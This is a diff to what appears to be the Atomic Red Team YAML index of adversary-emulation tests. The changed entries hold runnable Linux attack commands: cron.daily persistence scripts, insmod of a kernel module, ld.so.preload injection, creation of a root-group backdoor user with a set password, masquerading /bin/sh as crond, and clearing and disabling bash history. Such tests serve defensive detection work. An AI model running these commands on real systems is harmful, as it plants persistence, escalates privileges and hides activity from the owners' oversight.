@@ -1944,6 +1944,7 @@ privilege-escalation:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1574.001:
@@ -3199,11 +3200,11 @@ privilege-escalation:
         module_name:
           description: Name of the kernel module name.
           type: string
-          default: T1547.006
+          default: T1547006
         module_path:
           description: Folder used to store the module.
           type: path
-          default: PathToAtomicsFolder/T1547.006/bin/T1547.006.ko
+          default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
           type: path
@@ -3220,15 +3221,14 @@ privilege-escalation:
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
-          mv #{temp_folder}/#{module_name}.ko #{module_path}
-          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
+          if [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;
       executor:
         command: 'sudo insmod #{module_path}
 
 '
-        cleanup_command: 'sudo rmmod #{module_name}
-
-'
+        cleanup_command: |
+          sudo rmmod #{module_name}
+          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
         name: bash
         elevation_required: true
   T1546.006:
@@ -3351,7 +3351,7 @@ privilege-escalation:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -3362,7 +3362,7 @@ privilege-escalation:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -3383,7 +3383,7 @@ privilege-escalation:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -10075,6 +10075,7 @@ persistence:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1574.001:
@@ -11194,11 +11195,11 @@ persistence:
         module_name:
           description: Name of the kernel module name.
           type: string
-          default: T1547.006
+          default: T1547006
         module_path:
           description: Folder used to store the module.
           type: path
-          default: PathToAtomicsFolder/T1547.006/bin/T1547.006.ko
+          default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
           type: path
@@ -11215,15 +11216,14 @@ persistence:
           if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
           cp #{module_source_path}/* #{temp_folder}/
           cd #{temp_folder}; make
-          mv #{temp_folder}/#{module_name}.ko #{module_path}
-          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
+          if [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;
       executor:
         command: 'sudo insmod #{module_path}
 
 '
-        cleanup_command: 'sudo rmmod #{module_name}
-
-'
+        cleanup_command: |
+          sudo rmmod #{module_name}
+          [ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
         name: bash
         elevation_required: true
   T1546.006:
@@ -11346,7 +11346,7 @@ persistence:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -11357,7 +11357,7 @@ persistence:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -11378,7 +11378,7 @@ persistence:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -11912,9 +11912,10 @@ persistence:
           type: String
           default: BetterWithButter
       executor:
-        command: |
-          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
-          echo "#{password}" | passwd --stdin #{username}
+        command: "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release
+          | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" |
+          sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;
+          \     \n"
         cleanup_command: 'userdel #{username}
 
 '
@@ -18301,6 +18302,13 @@ credential-access:
           description: Specify interface to perform PCAP on.
           type: String
           default: ens33
+      dependency_executor_name: bash
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -20280,6 +20288,9 @@ defense-evasion:
         command: 'dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}
 
 '
+        cleanup_command: 'rm #{file_to_pad}
+
+'
         name: sh
   T1542.003:
     technique:
@@ -20832,6 +20843,22 @@ defense-evasion:
         command: |
           unset HISTFILE
           export HISTFILESIZE=0
+          history -c
+        name: sh
+    - name: Clear and Disable Bash History Logging
+      auto_generated_guid: 784e4011-bd1a-4ecd-a63a-8feb278512e6
+      description: 'Clears the history and disable bash history logging of the current
+        shell and future shell sessions
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      executor:
+        command: |
+          set +o history
+          echo 'set +o history' >> ~/.bashrc
+          . ~/.bashrc
           history -c
         name: sh
   T1551.002:
@@ -23768,7 +23795,7 @@ defense-evasion:
       executor:
         command: |
           export HISTCONTROL=ignoreboth
-          ls #{evil_command}
+          #{evil_command}
         name: sh
     - name: Mac HISTCONTROL
       auto_generated_guid: 468566d5-83e5-40c1-b338-511e1659628d
@@ -25490,7 +25517,7 @@ defense-evasion:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -25501,7 +25528,7 @@ defense-evasion:
         command: 'sudo sh -c ''echo #{path_to_shared_library} > /etc/ld.so.preload''
 
 '
-        cleanup_command: 'sudo sed -i ''/#{path_to_shared_library}/d'' /etc/ld.so.preload
+        cleanup_command: 'sudo sed -i ''\~#{path_to_shared_library}~d'' /etc/ld.so.preload
 
 '
         name: bash
@@ -25522,7 +25549,7 @@ defense-evasion:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: PathToAtomicsFolder/T1574.006/bin/T1574.006.so
+          default: "/tmp/T1574006.so"
       dependency_executor_name: bash
       dependencies:
       - description: The shared library must exist on disk at specified location (#{path_to_shared_library})
@@ -29037,8 +29064,11 @@ defense-evasion:
       - linux
       executor:
         command: |
-          cp /bin/sh /tmp/crond
+          cp /bin/sh /tmp/crond;
           /tmp/crond
+        cleanup_command: 'rm /tmp/crond
+
+'
         name: sh
     - name: Masquerading - cscript.exe running as notepad.exe
       auto_generated_guid: 3a2a578b-0a01-46e4-92e3-62e2859b42f0
@@ -36357,6 +36387,13 @@ discovery:
           description: Specify interface to perform PCAP on.
           type: String
           default: ens33
+      dependency_executor_name: bash
+      dependencies:
+      - description: Check if at least one of the tools are installed on the machine.
+        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
+          tshark)" ]; then exit 1; else exit 0; fi;
+        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+          exit 1;
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -36732,6 +36769,9 @@ discovery:
         command: |
           ps >> #{output_file}
           ps aux >> #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
         name: sh
     - name: Process Discovery - tasklist
       auto_generated_guid: c5806a4f-62b8-4900-980b-c7ec004e9908
@@ -38547,6 +38587,7 @@ execution:
           type: string
           default: persistevil
       executor:
+        elevation_required: true
         name: bash
         command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
   T1559.002:
